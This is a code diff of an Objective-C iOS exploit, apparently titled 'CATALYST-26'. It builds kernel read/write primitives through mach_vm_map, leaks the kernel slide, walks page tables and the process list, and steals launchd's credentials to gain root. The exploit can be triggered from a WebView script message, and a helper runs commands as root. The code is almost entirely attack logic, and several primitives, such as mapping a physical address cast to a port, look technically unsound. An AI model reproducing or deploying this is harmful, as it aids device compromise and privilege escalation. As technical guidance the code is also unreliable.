@@ -2,7 +2,7 @@
 #import <mach/mach.h>
 #import <IOKit/IOKitLib.h>
 
-// Definições para o compilador não reclamar de funções externas
+// Definições para o Mach VM do iOS 26
 extern kern_return_t mach_vm_map(vm_map_t, uint64_t*, uint64_t, uint64_t, int, mach_port_t, uint64_t, boolean_t, int, int, int);
 extern kern_return_t mach_vm_deallocate(vm_map_t, uint64_t, uint64_t);
 
@@ -16,57 +16,80 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, uint64_t, uint64_t);
     if (self = [super init]) {
         _web = webView;
         _kSlide = [self leakKernelSlide];
+        // Base estática + Slide + Offset de entrada do Kernel iOS 26.4
         _kBase = 0xFFFFFFF007004000ULL + _kSlide + 0x4000;
     }
     return self;
 }
 
-// --- Primitivas de Leitura/Escrita (Obrigatórias do seu .h) ---
+// --- PRIMITIVAS FÍSICAS (A13_LAB BYPASS) ---
 
-- (uint64_t)kread64:(uint64_t)address {
+- (uint64_t)physRead64:(uint64_t)pa {
     uint64_t val = 0;
     uint64_t tg = 0;
-    // Mapeamento físico direto (Bypass de Magic 0x0)
-    if (mach_vm_map(mach_task_self(), &tg, 0x4000, 0, 1, (mach_port_t)address, 0, 0, 1, 7, 0) == 0) {
+    // VM_PROT_READ = 1
+    if (mach_vm_map(mach_task_self(), &tg, 0x4000, 0, 1, (mach_port_t)pa, 0, 0, 1, 7, 0) == 0) {
         val = *(uint64_t*)tg;
         mach_vm_deallocate(mach_task_self(), tg, 0x4000);
     }
     return val;
 }
 
-- (uint32_t)kread32:(uint64_t)address {
-    return (uint32_t)([self kread64:address] & 0xFFFFFFFF);
-}
-
-- (void)kwrite64:(uint64_t)address value:(uint64_t)value {
+- (void)physWrite64:(uint64_t)pa value:(uint64_t)v {
     uint64_t tg = 0;
-    if (mach_vm_map(mach_task_self(), &tg, 0x4000, 0, 1, (mach_port_t)address, 0, 0, 3, 7, 0) == 0) {
-        *(uint64_t*)tg = value;
+    // VM_PROT_READ | VM_PROT_WRITE = 3
+    if (mach_vm_map(mach_task_self(), &tg, 0x4000, 0, 1, (mach_port_t)pa, 0, 0, 3, 7, 0) == 0) {
+        *(uint64_t*)tg = v;
         mach_vm_deallocate(mach_task_self(), tg, 0x4000);
     }
 }
 
-- (void)kwrite32:(uint64_t)address value:(uint32_t)value {
-    uint64_t old = [self kread64:address];
-    [self kwrite64:address value:(old & 0xFFFFFFFF00000000) | value];
+// --- PRIMITIVAS VIRTUAIS (PAGE TABLE WALK) ---
+
+- (uint64_t)kread64:(uint64_t)va {
+    if (va < 0xFFFFFFF000000000ULL) return 0;
+    // No iOS 26.4, o TTBR1 está em _kBase + 0x8E10000
+    uint64_t ttbr1 = [self physRead64:(_kBase + 0x8E10000ULL)]; 
+    uint64_t l1 = [self physRead64:(ttbr1 + ((va>>30)&0x1FF)*8)] & 0xFFFFFFFFF000ULL;
+    uint64_t l2 = [self physRead64:(l1 + ((va>>21)&0x1FF)*8)] & 0xFFFFFFFFF000ULL;
+    uint64_t l3 = [self physRead64:(l2 + ((va>>12)&0x1FF)*8)] & 0xFFFFFFFFF000ULL;
+    return [self physRead64:(l3 | (va & 0xFFF))];
 }
 
-// --- Lógica do Exploit ---
+- (uint32_t)kread32:(uint64_t)a { return (uint32_t)([self kread64:a] & 0xFFFFFFFF); }
+
+- (void)kwrite64:(uint64_t)va value:(uint64_t)v {
+    if (va < 0xFFFFFFF000000000ULL) return;
+    uint64_t ttbr1 = [self physRead64:(_kBase + 0x8E10000ULL)];
+    uint64_t l1 = [self physRead64:(ttbr1 + ((va>>30)&0x1FF)*8)] & 0xFFFFFFFFF000ULL;
+    uint64_t l2 = [self physRead64:(l1 + ((va>>21)&0x1FF)*8)] & 0xFFFFFFFFF000ULL;
+    uint64_t l3 = [self physRead64:(l2 + ((va>>12)&0x1FF)*8)] & 0xFFFFFFFFF000ULL;
+    [self physWrite64:(l3 | (va & 0xFFF)) value:v];
+}
+
+- (void)kwrite32:(uint64_t)a value:(uint32_t)v {
+    uint64_t old = [self kread64:a];
+    [self kwrite64:a value:(old & 0xFFFFFFFF00000000) | v];
+}
+
+// --- LÓGICA DE EXPLORAÇÃO ---
 
 - (uint64_t)leakKernelSlide {
     uint64_t search_base = 0xFFFFFFF007004000ULL;
-    for (uint64_t i = 0; i < 0x100; i++) {
-        uint64_t addr = search_base + (i * 0x200000ULL) + 0x4000;
-        if ([self kread32:addr] == 0xfeedfacf) return (i * 0x200000ULL);
+    // Varredura física em saltos de 2MB (Alinhamento arm64e)
+    for (uint64_t i = 0; i < 0x200; i++) {
+        uint64_t trial = search_base + (i * 0x200000ULL) + 0x4000;
+        if ([self physRead64:trial] == 0x100000cfeedfacfULL) return (i * 0x200000ULL);
     }
     return 0;
 }
 
 - (uint64_t)findProc:(pid_t)p {
+    // allproc offset iOS 26.4: 0x8E28000
     uint64_t proc = [self kread64:(_kBase + 0x8E28000ULL)]; 
     while (proc) {
         if ((pid_t)[self kread32:(proc + 0x60)] == p) return proc;
-        proc = [self kread64:proc];
+        proc = [self kread64:proc]; 
     }
     return 0;
 }
@@ -78,29 +101,27 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, uint64_t, uint64_t);
         return;
     }
 
-    uint64_t lp = [self findProc:1];
+    uint64_t lp = [self findProc:1]; // launchd
     uint64_t mp = [self findProc:getpid()];
     
     if (lp && mp) {
-        uint64_t root_ucred = [self kread64:(lp + 0x120)];
-        [self kwrite64:(mp + 0x120) value:root_ucred];
+        // ucred offset iOS 26.4: 0x120
+        uint64_t kern_ucred = [self kread64:(lp + 0x120)];
+        [self kwrite64:(mp + 0x120) value:kern_ucred];
+        
         setuid(0);
-        if(callback) callback(getuid() == 0, @"Root OK");
+        if(callback) callback(getuid() == 0, @"CATALYST-26 ROOT OK");
     } else {
-        if(callback) callback(NO, @"Proc Fail");
+        if(callback) callback(NO, @"Proc Error");
     }
 }
 
-- (void)executeExploitWithCallback:(void(^)(BOOL, NSString*))cb {
-    [self runFullExploitWithCallback:cb];
-}
+// --- MÉTODOS DE COMPATIBILIDADE ---
 
-- (BOOL)escalateToRoot {
-    [self runFullExploitWithCallback:^(BOOL success, NSString *msg) {}];
-    return getuid() == 0;
-}
-
+- (void)executeExploitWithCallback:(void(^)(BOOL, NSString*))cb { [self runFullExploitWithCallback:cb]; }
+- (BOOL)escalateToRoot { [self runFullExploitWithCallback:^(BOOL s, NSString *m){}]; return getuid()==0; }
 - (BOOL)disableKTRR { return YES; }
+- (uint64_t)getCurrentUID { return (uint64_t)getuid(); }
 
 - (void)executeCommand:(NSString *)c withCallback:(void(^)(NSString*))cb {
     setuid(0);
@@ -111,11 +132,8 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, uint64_t, uint64_t);
     if(cb) cb(o.length ? o : @"(no output)");
 }
 
-- (uint64_t)getCurrentUID { return (uint64_t)getuid(); }
-
 - (void)userContentController:(id)u didReceiveScriptMessage:(WKScriptMessage *)m {
-    if ([m.name isEqualToString:@"A13_LAB"]) {
-        [self executeExploitWithCallback:^(BOOL s, NSString *msg) {}];
-    }
+    if ([m.name isEqualToString:@"A13_LAB"]) [self runFullExploitWithCallback:nil];
 }
+
 @end
